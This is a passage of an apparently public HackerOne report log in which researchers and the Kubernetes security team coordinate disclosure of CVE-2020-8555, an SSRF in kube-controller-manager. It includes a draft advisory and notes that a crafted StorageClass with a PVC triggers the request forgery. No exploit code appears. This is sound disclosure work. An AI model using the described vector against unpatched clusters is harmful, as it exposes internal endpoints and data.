st","toastycat","reeverzax","zeroxyele","yinvi777","virus0x01","victor_pct","asanso","zimmer75","and 9 more..."],"severity":{"rating":"high","score":8.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":32487,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/kubernetes/kube-controller-manager","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6781955,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"automated_response":false,"created_at":"2020-01-15T22:39:52.355Z","updated_at":"2020-01-15T22:39:52.355Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"email":"hach","genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6781981,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","automated_response":false,"created_at":"2020-01-15T22:45:00.379Z","updated_at":"2020-01-15T22:45:00.379Z","actor":{"username":"hach","cleared":false,"url":"/hach","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/199/263/cfaa700ed13ac09a2c77bce265efc359620ae165_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6792985,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you @reeverzax! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.","automated_response":false,"created_at":"2020-01-16T17:06:29.740Z","updated_at":"2020-01-16T17:06:29.740Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6793196,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @tuxedo, \n\nnice to meet you. \nThanks for triage and about severity we completely understand that this is not the final version as we're bringing to your attention a quite tricky situation where the impact is related to the third actor (the hosting company).\n\nFeel free to reach us if you wan't additional information about this. \n\nHave a nice day. \n\n@reeverzax  \u0026 @hach ","automated_response":false,"created_at":"2020-01-16T17:29:37.332Z","updated_at":"2020-01-16T17:29:37.332Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6793590,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report. As you mention, the remediation and mitigations of this are complicated due to the dependence on the cluster setup and external environment. We would like to have a longer embargo timeline on this than usual while we coordinate with distributors. We are already coordinating with the Google Cloud and AWS teams. We're currently targeting a mid-March announcement. Are you comfortable with this timeline?\n\nTim Allclair, on behalf of the Kubernetes Product Security Committee","automated_response":false,"created_at":"2020-01-16T18:21:12.136Z","updated_at":"2020-01-16T18:21:12.136Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6825241,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @tallclair , \n\nnice to meet you and sorry for the delay. \nWe're completely comfortable with the timeline you requested as we understand that the coordination process with all distributors will represent an important process to handle.\n\nFeel free to give us updates if you need any additional information :)\n\nBest Regards, \n\nBrice \u0026 Christophe","automated_response":false,"created_at":"2020-01-21T11:28:49.154Z","updated_at":"2020-01-21T11:28:49.154Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7210517,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @tallclair, \n\nwe're getting in touch with you in order to know if you have any news to bring to our attention regarding this case ? \n\nThank you and have a nice day :)\n\nSincerely, \n\nBrice \u0026 Christophe","automated_response":false,"created_at":"2020-03-03T20:23:45.281Z","updated_at":"2020-03-03T20:23:45.281Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7216238,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @reeverzax ,\n\nI can see this case is being finalised internally over the past 24 hours, so hold tight and we will summarise shortly for you!\n\nLuke","automated_response":false,"created_at":"2020-03-04T10:54:09.917Z","updated_at":"2020-03-04T10:54:09.917Z","actor":{"username":"lhinds","cleared":false,"url":"/lhinds","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fCkgDUjggTMTjTRYQdtZyMqs/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7227425,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for the report. We've decided to award this as a Tier 1 High severity vulnerability. I'm afraid we don't have any updates on resolution or disclosure timelines yet.","automated_response":false,"created_at":"2020-03-04T18:02:35.944Z","updated_at":"2020-03-04T18:02:35.944Z","actor":{"url":"/kubernetes","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Kubernetes"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"kubernetes","collaborator":{"username":"hach","url":"/hach"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7227426,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for the report. We've decided to award this as a Tier 1 High severity vulnerability. I'm afraid we don't have any updates on resolution or disclosure timelines yet.","automated_response":false,"created_at":"2020-03-04T18:02:36.275Z","updated_at":"2020-03-04T18:02:36.275Z","actor":{"url":"/kubernetes","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Kubernetes"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"kubernetes","collaborator":{"username":"reeverzax","url":"/reeverzax"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7227579,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2020-03-04T18:19:44.890Z","updated_at":"2020-03-04T18:19:44.890Z","cve_ids":["CVE-2020-8555"],"actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7227780,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, Wow that's a really great news !\n\nThank you for your feedback and the reward :D ! \n\nThis is quite a complicated case for us as there are multiple companies involved in it. That's the reason why we would like to ask you the following question : \n\nAre we allowed, without giving details, to answer to the companies we were initially in relation with that there is no \"updates on resolution or disclosure timelines yet\"  and that they should try to get in touch with Kubernetes Product Security Committee if they wan't to have more specific details ? \n\nObviously, since you triaged the vulnerability, we stopped our investigations on the other hosting providers that might be concerned about the root vulnerability.\n\nOnce again, thank you very much and have a nice day. \n\nBest Regards, \n\nBrice \u0026 Christophe. ","automated_response":false,"created_at":"2020-03-04T18:39:31.281Z","updated_at":"2020-03-04T18:39:31.281Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7227887,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, please do. They can use CVE-2020-8555 to disambiguate when inquiring about this, and reach out to security-discuss-private@kubernetes.io\n\nThanks!","automated_response":false,"created_at":"2020-03-04T18:56:03.963Z","updated_at":"2020-03-04T18:56:03.963Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7562526,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The public announcement date for this has been set at June 1st. We've notified our distributors list, and are giving them extra time to patch due to the complexity of the fixes and the current global situation.","automated_response":false,"created_at":"2020-04-06T18:29:33.422Z","updated_at":"2020-04-06T18:29:33.422Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8080933,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Tim Allclair, \n\nHope everything is ok on your side and you're in good health condition. \n\nWe're getting in touch with you in order to know if 1st June is still ok regarding public disclosure on your side (and distributors too) ? \n\nIn addition, Hugues Masselin from HackerOne got in touch with us recently asking us to answer a few questions for their incoming EMEA marketing planned campaign where we're supposed to give testimony as French Elite Hackers :\n\n- What is the most impactful bug you have found?\u2028\n- What was your process for finding it?\n- What could the consequences have been had the bug been exploited?\n- \u2028How common are bugs like these?\u2028\n- What are your favourite type of bugs to find?\u2028\n- What should companies be most concerned about?\u2029\n\nThrough this campaign that will be broadcasted after the 1st of June (we can provide a written acknowledge from HackerOne team), we would like to know if we can freely talk about our research work on Kubernetes security bug (specially for the first three questions).\n\nWe already got an approval from Microsoft as a part of this research project was made in their managed service perimeter. \n\nIn addition to this, we're now working on a technical write up on medium about our research work. Would you like us to provide you the draft link before any public disclosure ? \n\nHave a nice day. \n\nBest Regards, \n\nBrice \u0026 Christophe.","automated_response":false,"created_at":"2020-05-22T15:40:34.419Z","updated_at":"2020-05-22T15:40:34.419Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8134069,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reeverzax - Sorry for the delayed response. Yes, we are still planning a public announcement on June 1st, around 9am PT. Please watch https://groups.google.com/g/kubernetes-security-announce for the announcement and do not publish anything before the announcement is made. You may freely discuss the vulnerability, but we would appreciate a draft of the technical details before publishing.\n\nHow would you like to be credited? I currently have:\nBrice Augras from Groupe-Asten, Christophe Hauquiert\n\n","automated_response":false,"created_at":"2020-05-28T16:55:09.979Z","updated_at":"2020-05-28T16:55:09.979Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8136764,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI, we've decided to drop the integrity impact to `none`, which downgrades this to a medium (https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N).\n\nHere is a pre-release draft of our planned announcement issue:\n\n---\n\nTITLE: CVE-2020-8555: Half-Blind SSRF in kube/cloud-controller-manager\n\nCVSS Rating: [CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N)\n\nThere exists a Server Side Request Forgery (SSRF) vulnerability in kube-controller-manager that allows certain authorized users to leak up to 500 bytes of arbitrary information from unprotected endpoints within the master's host network (such as link-local or loopback services).\n \nAn attacker with permissions to create a pod with certain built-in Volume types (GlusterFS, Quobyte, StorageFS, ScaleIO) or permissions to create a StorageClass can cause kube-controller-manager to make GET requests or POST requests without an attacker controlled request body from the master's host network.\n \n### Am I vulnerable?\n\nYou may be vulnerable if:\n\n- You are running a vulnerable version (see below)\n- There are unprotected endpoints normally only visible from the Kubernetes master (including link-local metadata endpoints, unauthenticated services listening on localhost, or other services in the master's private network)\n- Untrusted users can create pods with an affected volume type or modify storage classes.\n\n#### Affected Versions\n\n- kube-controller-manager v1.18.0\n- kube-controller-manager v1.17.0 - v1.17.4\n- kube-controller-manager v1.16.0 - v1.16.8\n- kube-controller-manager \u003c v1.15.11\n \nThe affected volume types are: GlusterFS, Quobyte, StorageFS, ScaleIO\n\n### How do I mitigate this vulnerability?\n\nPrior to upgrading, this vulnerability can be mitigated by adding endpoint protections on the master or restricting usage of the vulnerable volume types (for example by constraining usage with a [PodSecurityPolicy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems) or third-party admission controller such as [Gatekeeper](https://github.com/open-policy-agent/gatekeeper)) and restricting StorageClass write permissions through RBAC.\n\n#### Fixed Versions\n\nThe information leak was patched in the following versions:\n\n- kube-controller-manager master - fixed by https://github.com/kubernetes/kubernetes/pull/89794\n- kube-controller-manager v1.18.1+ - fixed by https://github.com/kubernetes/kubernetes/pull/89796\n- kube-controller-manager v1.17.5+ - fixed by https://github.com/kubernetes/kubernetes/pull/89837\n- kube-controller-manager v1.16.9+ - fixed by https://github.com/kubernetes/kubernetes/pull/89838\n- kube-controller-manager v1.15.12+ - fixed by https://github.com/kubernetes/kubernetes/pull/89839\n\nTo upgrade, refer to the documentation: https://kubernetes.io/docs/tasks/administer-cluster/cluster-management/#upgrading-a-cluster\n\n## Additional Details\n\n_Optional details:_\n- Vulnerability background\n- Technical explanation of vulnerability and/or fix\n- Reproduction steps (avoid disclosing unnecessary details)\n\n#### Acknowledgements\n\nThis vulnerability was reported by Brice Augras from Groupe-Asten and Christophe Hauquiert\n","automated_response":false,"created_at":"2020-05-28T21:01:29.843Z","updated_at":"2020-05-28T21:01:29.843Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8137458,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tallclair \n\nThank you for your response, actually we are still working on the write-up but we can already share a first draft of our work : https://medium.com/@BreizhZeroDayHunters/draft-brice-christophe-publication-1er-juin-technique-8f6b448eafa8\n\nIt's not 100% done yet but the different chapters were written done.\nGrammar checking + last complete review will be done this week-end so we should be ready for Monday 1st June.\nOf course we will wait the announcement before publishing anything.\n\nAbout credit can you add \"from Nokia\" after my name ?\n`This vulnerability was reported by Brice Augras from Groupe-Asten and Christophe Hauquiert from Nokia`\n\nBrice \u0026 Christophe.","automated_response":false,"created_at":"2020-05-28T22:00:04.564Z","updated_at":"2020-05-28T22:00:04.564Z","actor":{"username":"hach","cleared":false,"url":"/hach","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/199/263/cfaa700ed13ac09a2c77bce265efc359620ae165_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8139808,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hach, thanks for sharing your draft. I've updated our draft issue to credit you as `from Nokia`.","automated_response":false,"created_at":"2020-05-29T00:42:06.964Z","updated_at":"2020-05-29T00:42:22.129Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8147746,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tallclair \n\nWe have additional questions about the CVE draft you sent : \n- ```\nAn attacker with permissions to create a pod with certain built-in Volume types (GlusterFS, Quobyte, StorageFS, ScaleIO) or permissions to create a StorageClass can cause kube-controller-manager to make GET requests or POST requests without an attacker controlled request body from the master's host network.\n```\nWhen we exploited the vulnerability we never needed to create a pod, we just created a malicious storageclass with a PVC using it and that was enough to trigger a dynamic volume provisioning workflow. So we don't understand why the CVE is talking about pods, do you have additional information regarding this step ?\n\n- Same question about\n ```\nUntrusted users can create pods\n```\nand\n```\n(for example by constraining usage with a PodSecurityPolicy\n```\nOur understanding of PodSecurityPolicy is that it only restricts pod creation/edition process  and not PersistentVolumeClaim resource.  We also read in the documentation \"Warning: PodSecurityPolicy does not limit the types of PersistentVolume objects that may be referenced by a PersistentVolumeClaim\". Regarding that we don't understand how PSP could mitigate this vulnerability as dynamic volume provisioning is triggered as soon as PVC object is created.\n\nBrice \u0026 Christophe","automated_response":false,"created_at":"2020-05-29T16:42:22.297Z","updated_at":"2020-05-29T16:42:22.297Z","actor":{"username":"hach","cleared":false,"url":"/hach","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/199/263/cfaa700ed13ac09a2c77bce265efc359620ae165_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8169170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @tallclair,\n\nWe finished to write our writeup : https://medium.com/@BreizhZeroDayHunters/when-its-not-only-about-a-kubernetes-cve-8f6b448eafa8\nWe are now waiting for CVE disclosure and we will wait your approval to publish.\n\nRegards,\nBrice \u0026 Christophe","automated_response":false,"created_at":"2020-06-01T15:20:15.734Z","updated_at":"2020-06-01T15:20:15.734Z","actor":{"username":"hach","cleared":false,"url":"/hach","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/199/263/cfaa700ed13ac09a2c77bce265efc359620ae165_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8170228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI, announcement is live: https://groups.google.com/d/msg/kubernetes-security-announce/kEK27tqqs30/49XlMZ81AwAJ\n\n\u003e When we exploited the vulnerability we never needed to create a pod, we just created a malicious storageclass with a PVC using it and that was enough to trigger a dynamic volume provisioning workflow. So we don't understand why the CVE is talking about pods, do you have additional information regarding this step ?\n\nCreating a StorageClass is generally considered higher privilege than creating a pod. Our team was able to identify a path to exploit from a pod, but we're not sharing the details right now.\n\n\u003e Our understanding of PodSecurityPolicy is that it only restricts pod creation/edition process and not PersistentVolumeClaim resource. We also read in the documentation \"Warning: PodSecurityPolicy does not limit the types of PersistentVolume objects that may be referenced by a PersistentVolumeClaim\". Regarding that we don't understand how PSP could mitigate this vulnerability as dynamic volume provisioning is triggered as soon as PVC object is created.\n\nSimilarly, creating PVs is typically designated to an admin, so a PSP is a way of preventing less privileged users from exploiting this.","automated_response":false,"created_at":"2020-06-01T17:15:52.717Z","updated_at":"2020-06-01T17:15:52.717Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8170805,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Tim,\n\nThank you very much for this technical feedback :) We know better understand the fixing solutions. \n\nWe would like to know if it's possible for you to add the Acknowlegdment part on the Google groups announce?\n\nThank you  and have a nice day ! ","automated_response":false,"created_at":"2020-06-01T18:12:46.445Z","updated_at":"2020-06-01T18:12:46.445Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8181905,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The acknowledgement got dropped in an effort to make our announcement emails more concise and streamlined, but I think this was a mistake, and will add it back to our template. That said, because of how widely the email is distributed, I don't want to send the correction on it's own. If there is a follow up, I will include the acknowledgement, and will also add the acknowledgement to the security-discuss thread.","automated_response":false,"created_at":"2020-06-02T17:35:46.933Z","updated_at":"2020-06-02T17:35:46.933Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8181995,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"https://groups.google.com/d/msg/kubernetes-security-discuss/J24-PpPXRQ0/O0_lHfLTAgAJ","automated_response":false,"created_at":"2020-06-02T17:48:35.398Z","updated_at":"2020-06-02T17:48:35.398Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8612462,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing this as resolved since the CVE is published, and the initial mitigations are in place. We have more mitigations that are being added, probably in the August release.","automated_response":false,"created_at":"2020-07-15T21:30:39.134Z","updated_at":"2020-07-15T21:30:39.134Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"reeverzax","url":"/reeverzax"},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9688165,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-30T21:28:28.415Z","updated_at":"2020-10-30T21:28:28.415Z","first_to_agree":true,"actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9688217,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We're very glad about how the vulnerability was handled. Once again, thanks for all :)","automated_response":false,"created_at":"2020-10-30T21:37:18.686Z","updated_at":"2020-10-30T21:37:18.686Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9688218,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-30T21:37:19.147Z","updated_at":"2020-10-30T21:37:19.147Z","actor":{"username":"reeverzax","cleared":false,"url":"/reeverzax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}